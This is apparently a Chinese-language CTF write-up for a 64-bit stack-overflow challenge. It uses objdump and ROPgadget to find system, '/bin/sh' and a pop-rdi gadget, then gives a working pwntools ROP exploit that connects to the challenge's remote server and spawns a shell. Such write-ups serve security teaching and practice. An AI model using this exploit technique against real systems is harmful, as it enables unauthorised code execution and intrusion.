---
title: Lilac Pwn stack3-rop Writeup
date: 2020-11-01 14:10:46
tags:
- CTF刷题
- PWN
- ROP
- 栈溢出
categories: 竞赛
mathjax: true
---

[题目链接](http://pwn.hitctf.cn:8000/challenges)

<!-- more -->

![20201101095017](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101095017.png)

文件类型是 64 位 ELF。

![20201101095122](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101095122.png)

开了 NX 保护。

用 IDA64 查看一下：

![20201101100449](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101100449.png)

可以看到可以栈溢出。

```shell
objdump -d stack3 | grep 'plt'
```

![20201101095523](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101095523.png)

可以看到有 system 函数，地址为 `0x400600`。

```shell
ROPgadget --binary stack3 --string '/bin/sh'
```

![20201101095700](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101095700.png)

可以看到有字符串 "/bin/sh"，地址为 `0x4008a4`。

由于是 64 位，参数先保存在 `RDI`，`RSI`，`RDX`，`RCX`，`R8`，`R9`，然后才是栈。

查看是否有可利用的 gadgets：

```shell
ROPgadget --binary stack3 --only 'pop|ret' | grep 'rdi'
```

![20201101100042](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101100042.png)

找到一条。

那么可以构造 exp 了：

```python
from pwn import *

# p = process("./stack3")
p = remote("47.94.239.235", 2023)

poprdi_addr = 0x400883
system_addr = 0x400600
binsh_addr = 0x4008a4

payload = b'a' * (0x20 + 0x8) + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)

p.sendline(payload)

p.interactive()
```

![20201101101355](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101101355.png)

可以看到成功拿到 shell。